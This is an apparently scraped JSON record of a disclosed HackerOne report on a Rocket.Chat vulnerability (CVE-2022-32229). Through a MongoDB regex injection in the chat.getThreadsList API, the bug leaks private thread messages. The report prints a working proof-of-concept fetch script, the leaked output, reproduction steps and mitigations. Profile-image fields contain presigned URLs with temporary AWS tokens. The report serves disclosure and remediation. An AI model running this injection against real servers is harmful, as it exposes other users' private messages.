@@ -1,0 +1,138 @@
+{
+  "id": 1446767,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDQ2NzY3",
+  "url": "https://hackerone.com/reports/1446767",
+  "title": "API route chat.getThreadsList leaks private message content",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-01-11T13:21:40.696Z",
+  "submitted_at": "2022-01-11T13:21:40.749Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "gronke",
+    "url": "/gronke",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19858,
+    "url": "https://hackerone.com/rocket_chat",
+    "handle": "rocket_chat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rocket.Chat",
+      "twitter_handle": "RocketChat",
+      "website": "https://rocket.chat",
+      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": true,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "no-content",
+  "cve_ids": [
+    "CVE-2022-32229"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-09-22T16:03:36.155Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2022-09-22T12:21:27.196Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2022-10-22T12:21:27.288Z",
+  "allow_singular_disclosure_after": -111300389.4923587,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "shreyaschavhan",
+    "shivammusic",
+    "hasansaikat"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 194886,
+      "category": "team",
+      "content": "## Summary\n\nThe `/api/v1/chat.getThreadsList` does not sanitize user inputs and can therefore leak private thread messages to unauthorized users via Mongo DB injection.\n\n## Description\n\nThe `chat.getThreadsList` API route is defined in [app/api/server/v1/chat.js#L522-L572](https://github.com/RocketChat/Rocket.Chat/blob/50d55d7a11c35893483b5561131486bd8b6bad7f/app/api/server/v1/chat.js#L522-L572):\n\n```javascript\nconst { rid, type, text } = this.queryParams;\nconst { offset, count } = this.getPaginationItems();\nconst { sort, fields, query } = this.parseJsonQuery();\n\nif (!rid) {\n\tthrow new Meteor.Error('The required \"rid\" query param is missing.');\n}\nif (!settings.get('Threads_enabled')) {\n\tthrow new Meteor.Error('error-not-allowed', 'Threads Disabled');\n}\nconst user = Users.findOneById(this.userId, { fields: { _id: 1 } });\nconst room = Rooms.findOneById(rid, { fields: { t: 1, _id: 1 } });\nif (!canAccessRoom(room, user)) {\n\tthrow new Meteor.Error('error-not-allowed', 'Not Allowed');\n}\n\nconst typeThread = {\n\t_hidden: { $ne: true },\n\t...(type === 'following' && { replies: { $in: [this.userId] } }),\n\t...(type === 'unread' && {\n\t\t_id: { $in: Subscriptions.findOneByRoomIdAndUserId(room._id, user._id).tunread },\n\t}),\n\tmsg: new RegExp(escapeRegExp(text), 'i'),\n};\n\nconst threadQuery = { ...query, ...typeThread, rid, tcount: { $exists: true } };\nconst cursor = Messages.find(threadQuery, {\n\tsort: sort || { tlm: -1 },\n\tskip: offset,\n\tlimit: count,\n\tfields,\n});\n\nconst total = cursor.count();\n\nconst threads = cursor.fetch();\n\nreturn API.v1.success({\n\tthreads,\n\tcount: threads.length,\n\toffset,\n\ttotal,\n});\n```\n\nClients can provide JSON data in Query Parameters:\n\n```javascript\nconst { rid, type, text } = this.queryParams;\n```\n\nThe ACL check is performed against the first room returned by Mongo DB:\n\n```javascript\nconst room = Rooms.findOneById(rid, { fields: { t: 1, _id: 1 } });\nif (!canAccessRoom(room, user)) {\n\tthrow new Meteor.Error('error-not-allowed', 'Not Allowed');\n}\n```\n\nAfter the access permission check, the original `rid` parameter is again provided as Mongo DB query input, but unlike the ACL check can return multiple results:\n\n```javascript\nconst threadQuery = { ...query, ...typeThread, rid, tcount: { $exists: true } };\nconst cursor = Messages.find(threadQuery, {\n\tsort: sort || { tlm: -1 },\n\tskip: offset,\n\tlimit: count,\n\tfields,\n});\n```\n\nAn authenticated adversary can provide an input that matches to multiple rooms of which the first match can be read by the malicious user. MongoDB will return the results in storage order, so that the channel that passes the ACL check must have been created before the target. For demonstration purposes the `GENERAL` channel was used:\n\n```javascript\nconst TARGET_ROOM = \"<ROOM_ID>\";\n\nconst fetchApi = async (url, options = {}) => {\n\treturn fetch(`/api/v1/${url}`, {\n\t\t...options,\n\t\theaders: {\n\t\t\t'X-User-Id': Meteor._localStorage.getItem(Accounts.USER_ID_KEY),\n\t\t\t'X-Auth-Token': Meteor._localStorage.getItem(Accounts.LOGIN_TOKEN_KEY),\n\t\t\t'Content-Type': 'application/json',\n\t\t\t...(options.headers || {})\n\t\t}\n\t}).then((res) => res.json())\n\t.then((data) => { console.log(data); return data; });\n};\n\nfetchApi(\"chat.getThreadsList?rid[$regex]=GENERAL|${TARGET_ROOM}\").then(console.log)\n```\n\nThe object printed to the console has the secret message included in the `threads` property:\n\n```json\n{\n    \"threads\": [\n        {\n            \"_id\": \"7sJLzbjDL7iL56Lmc\",\n            \"rid\": \"YkJAwxJHe5t7BWimY\",\n            \"msg\": \"secret message\",\n            \"ts\": \"2022-01-11T12:26:20.603Z\",\n            \"u\": {\n                \"_id\": \"kYfzDMQLyPFjS9ASb\",\n                \"username\": \"gronke\",\n                \"name\": \"gronke\"\n            },\n            \"urls\": [],\n            \"mentions\": [],\n            \"channels\": [],\n            \"md\": [\n                {\n                    \"type\": \"PARAGRAPH\",\n                    \"value\": [\n                        {\n                            \"type\": \"PLAIN_TEXT\",\n                            \"value\": \"secret message\"\n                        }\n                    ]\n                }\n            ],\n            \"_updatedAt\": \"2022-01-11T12:45:40.086Z\",\n            \"replies\": [\n                \"kYfzDMQLyPFjS9ASb\"\n            ],\n            \"tcount\": 1,\n            \"tlm\": \"2022-01-11T12:45:39.971Z\"\n        }\n    ],\n    \"count\": 1,\n    \"offset\": 0,\n    \"total\": 1,\n    \"success\": true\n}\n```\n\nFor comparison it is not allowed to read the message directly:\n\n```javascript\n>>> Meteor.call(\"getMessages\", [\"7sJLzbjDL7iL56Lmc\"], console.log)\n{\n    \"isClientSafe\": true,\n    \"error\": \"error-not-allowed\",\n    \"reason\": \"Not allowed\",\n    \"details\": {\n        \"method\": \"getSingleMessage\"\n    },\n    \"message\": \"Not allowed [error-not-allowed]\",\n    \"errorType\": \"Meteor.Error\"\n}\n```\n\n## Releases Affected:\n\n  * develop\n\nThe change was introduced in [#7632f12c](https://github.com/RocketChat/Rocket.Chat/commit/7632f12cfcc7ed8ee8f843587fdff63b101cc765) and did not land in a release yet. Previous versions appear to be affected in a similar way, but within the `query` parameter instead of `rid`.\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n  1. Create a thread in a private room between users Alice and Bob\n  2. Login as Trudy\n  3. Leak Alice and Bobs private Room ID (not discussed here)\n  4. Query `/api/v1/chat.getThreadsList?rid[$regex]=GENERAL|${TARGET_ROOM_ID}`\n\n## Supporting Material/References:\n\n  * List any additional material (e.g. screenshots, logs, etc.)\n\n## Suggested mitigation\n\n  * Strictly verify input parameter type.\n  * Use the ROOM ID returned for ACL verification in the final query.\n\n## Impact\n\nAuthenticated users can leak thread messages from private rooms they should not have access to.\n\n## Fix\n\nFixed in version 5.0>",
+      "updated_at": "2022-09-22T12:21:05.373Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 1989106,
+        "username": "mrd0d",
+        "name": "Offsec team engineer",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2021-09-27T20:52:41.370Z",
+        "url": "https://hackerone.com/mrd0d",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/j9d22b8d3wdw2lskn3dviwszwnze/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67?response-content-disposition=inline%3B%20filename%3D%22Ghost%20Boy.jpeg%22%3B%20filename%2A%3DUTF-8%27%27Ghost%2520Boy.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWRIOPE3L%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T170756Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIAUgFseC7zbX5HQc6%2Bp8dfCl%2FqyG6WKYQz4hMbSiOUdGAiEAlYHdBRmEj0SxXq8F0IdmRR64cLxKq8SCK8NknV%2FhbrkqsgUIQRADGgwwMTM2MTkyNzQ4NDkiDE%2BZr7oRFYtkToKz9SqPBdHqMY9OseGJlSc4199T6BbcWizJ7Awmr%2BAr5o7iXlmsjaU0j73%2BO%2FYeV0CU8537MHuIBYT2VYeeuvJZslD5jlXd5J48kTB4o9s08o9ppELtfhl7qUPVwvNp3nS2iVENB1ZpBYcEevjVR7dmt7wdAucxBw8QS4IBcD%2BRvtOMpCfnR8tcv3I5SKEJ2RirDOJpOVOtJRfNRwBuftgefXnYJa3XFQyhXOex%2BOJm0oU71h89k%2Bf8PeBSfWZPMniKJYtb0cU%2FyXk3CCbavpv8CiQBt32w38CbtjsFYYJ%2FglQGQRiW4An5D7KrweF9bYihdT91dM241i2iB%2BWhoJ%2BfpIwuGhKofDko2c46c4P64zZsm%2BMOUf%2BYpErud56ZQgzC91m5M3qo8hpSBFfuw5JIgdk9fp1UdmrNyBXDUv2tXPJEtYp2NqnN4mYjLbiM5O%2FlrJWyA%2FYlkhc0Ug0TvOuOHYfGqp%2BwVWg9Axbx2ns2VdtSQklpBGvEYOMLjDY6VxNSWGBOzfZGSgd6IXbTqbxNvuQ%2BJRLwN590WjgaJqVS1wx5BVgYL4O5rrsopFKhVJ1I1wkSXbW4wVZECHnbGHgFiJL01dc%2BM8sqWW%2BfWJRIODDJAnu88krIL0%2FK7m7SNVstkOH36bR1gsLMnf9XSfpgT54rvlXbkLabE9jN7PRNMF2%2BGSOwwF47u4uU4BXUp5NRccOM7Ru9lTYGwtTnyUKu4NszDg34fcDazCx7eR8syBlS6YgZUISUpKioVxG7bQ7kvX%2FE%2FtJF2tcVrscPpssQGZTfwuK1Yj2DbHtlg5PoJ%2FrihZE3sGS7MWfdk3ORL%2BsvB%2BuF5BcRFc0GsP00MEBWq1mOlDTXa98EVLu%2FN5M15McFv0YwxrvYzwY6sQFLcenW2TyqtitqJFyHLpVwCoy9F6x1YDMn5rMZ7hONvsFERrx4ilLAVAGWXphNy04e5Q5Qc6yaN32Fe4WLcutWuzHJxlEXhI2uxIrTv3HN1IqaxO9dGMNSyUL5HeGNf2JocQaF6ZkeAlTtyUXR3WT6pwxPWMyssEwul21IMoIsnsKHw74pgHFlqiuwop9iMTKk4SInTp%2FcMwR17ff%2FbXyZnjeTq2Dc8qTHh4ng27HEaHg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bf8229f802c00f31216055354c45a9a6fe6c23b98f094e8c9c46ffa2a9cbef58",
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/j9d22b8d3wdw2lskn3dviwszwnze/74790fe75ac5dbe8a5140a122388d59ebac913dcfa941f0b3a45e6cad161f9ea?response-content-disposition=inline%3B%20filename%3D%22Ghost%20Boy.jpeg%22%3B%20filename%2A%3DUTF-8%27%27Ghost%2520Boy.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWRIOPE3L%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T170756Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIAUgFseC7zbX5HQc6%2Bp8dfCl%2FqyG6WKYQz4hMbSiOUdGAiEAlYHdBRmEj0SxXq8F0IdmRR64cLxKq8SCK8NknV%2FhbrkqsgUIQRADGgwwMTM2MTkyNzQ4NDkiDE%2BZr7oRFYtkToKz9SqPBdHqMY9OseGJlSc4199T6BbcWizJ7Awmr%2BAr5o7iXlmsjaU0j73%2BO%2FYeV0CU8537MHuIBYT2VYeeuvJZslD5jlXd5J48kTB4o9s08o9ppELtfhl7qUPVwvNp3nS2iVENB1ZpBYcEevjVR7dmt7wdAucxBw8QS4IBcD%2BRvtOMpCfnR8tcv3I5SKEJ2RirDOJpOVOtJRfNRwBuftgefXnYJa3XFQyhXOex%2BOJm0oU71h89k%2Bf8PeBSfWZPMniKJYtb0cU%2FyXk3CCbavpv8CiQBt32w38CbtjsFYYJ%2FglQGQRiW4An5D7KrweF9bYihdT91dM241i2iB%2BWhoJ%2BfpIwuGhKofDko2c46c4P64zZsm%2BMOUf%2BYpErud56ZQgzC91m5M3qo8hpSBFfuw5JIgdk9fp1UdmrNyBXDUv2tXPJEtYp2NqnN4mYjLbiM5O%2FlrJWyA%2FYlkhc0Ug0TvOuOHYfGqp%2BwVWg9Axbx2ns2VdtSQklpBGvEYOMLjDY6VxNSWGBOzfZGSgd6IXbTqbxNvuQ%2BJRLwN590WjgaJqVS1wx5BVgYL4O5rrsopFKhVJ1I1wkSXbW4wVZECHnbGHgFiJL01dc%2BM8sqWW%2BfWJRIODDJAnu88krIL0%2FK7m7SNVstkOH36bR1gsLMnf9XSfpgT54rvlXbkLabE9jN7PRNMF2%2BGSOwwF47u4uU4BXUp5NRccOM7Ru9lTYGwtTnyUKu4NszDg34fcDazCx7eR8syBlS6YgZUISUpKioVxG7bQ7kvX%2FE%2FtJF2tcVrscPpssQGZTfwuK1Yj2DbHtlg5PoJ%2FrihZE3sGS7MWfdk3ORL%2BsvB%2BuF5BcRFc0GsP00MEBWq1mOlDTXa98EVLu%2FN5M15McFv0YwxrvYzwY6sQFLcenW2TyqtitqJFyHLpVwCoy9F6x1YDMn5rMZ7hONvsFERrx4ilLAVAGWXphNy04e5Q5Qc6yaN32Fe4WLcutWuzHJxlEXhI2uxIrTv3HN1IqaxO9dGMNSyUL5HeGNf2JocQaF6ZkeAlTtyUXR3WT6pwxPWMyssEwul21IMoIsnsKHw74pgHFlqiuwop9iMTKk4SInTp%2FcMwR17ff%2FbXyZnjeTq2Dc8qTHh4ng27HEaHg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=afe327e38b2c1b96172020557b1083c94bc2877b549b2798ffa064390a47c6b2",
+          "xtralarge": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/j9d22b8d3wdw2lskn3dviwszwnze/fba683f28d17594d98b39d87e2b3aa09acb938c22d49b206f663ae961dc39adc?response-content-disposition=inline%3B%20filename%3D%22Ghost%20Boy.jpeg%22%3B%20filename%2A%3DUTF-8%27%27Ghost%2520Boy.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWRIOPE3L%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T170756Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIAUgFseC7zbX5HQc6%2Bp8dfCl%2FqyG6WKYQz4hMbSiOUdGAiEAlYHdBRmEj0SxXq8F0IdmRR64cLxKq8SCK8NknV%2FhbrkqsgUIQRADGgwwMTM2MTkyNzQ4NDkiDE%2BZr7oRFYtkToKz9SqPBdHqMY9OseGJlSc4199T6BbcWizJ7Awmr%2BAr5o7iXlmsjaU0j73%2BO%2FYeV0CU8537MHuIBYT2VYeeuvJZslD5jlXd5J48kTB4o9s08o9ppELtfhl7qUPVwvNp3nS2iVENB1ZpBYcEevjVR7dmt7wdAucxBw8QS4IBcD%2BRvtOMpCfnR8tcv3I5SKEJ2RirDOJpOVOtJRfNRwBuftgefXnYJa3XFQyhXOex%2BOJm0oU71h89k%2Bf8PeBSfWZPMniKJYtb0cU%2FyXk3CCbavpv8CiQBt32w38CbtjsFYYJ%2FglQGQRiW4An5D7KrweF9bYihdT91dM241i2iB%2BWhoJ%2BfpIwuGhKofDko2c46c4P64zZsm%2BMOUf%2BYpErud56ZQgzC91m5M3qo8hpSBFfuw5JIgdk9fp1UdmrNyBXDUv2tXPJEtYp2NqnN4mYjLbiM5O%2FlrJWyA%2FYlkhc0Ug0TvOuOHYfGqp%2BwVWg9Axbx2ns2VdtSQklpBGvEYOMLjDY6VxNSWGBOzfZGSgd6IXbTqbxNvuQ%2BJRLwN590WjgaJqVS1wx5BVgYL4O5rrsopFKhVJ1I1wkSXbW4wVZECHnbGHgFiJL01dc%2BM8sqWW%2BfWJRIODDJAnu88krIL0%2FK7m7SNVstkOH36bR1gsLMnf9XSfpgT54rvlXbkLabE9jN7PRNMF2%2BGSOwwF47u4uU4BXUp5NRccOM7Ru9lTYGwtTnyUKu4NszDg34fcDazCx7eR8syBlS6YgZUISUpKioVxG7bQ7kvX%2FE%2FtJF2tcVrscPpssQGZTfwuK1Yj2DbHtlg5PoJ%2FrihZE3sGS7MWfdk3ORL%2BsvB%2BuF5BcRFc0GsP00MEBWq1mOlDTXa98EVLu%2FN5M15McFv0YwxrvYzwY6sQFLcenW2TyqtitqJFyHLpVwCoy9F6x1YDMn5rMZ7hONvsFERrx4ilLAVAGWXphNy04e5Q5Qc6yaN32Fe4WLcutWuzHJxlEXhI2uxIrTv3HN1IqaxO9dGMNSyUL5HeGNf2JocQaF6ZkeAlTtyUXR3WT6pwxPWMyssEwul21IMoIsnsKHw74pgHFlqiuwop9iMTKk4SInTp%2FcMwR17ff%2FbXyZnjeTq2Dc8qTHh4ng27HEaHg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a2df5e4544ad63bb80a084b5429f1f4761fe12a36c8b7ba2bcf82ec3ee812d7c"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
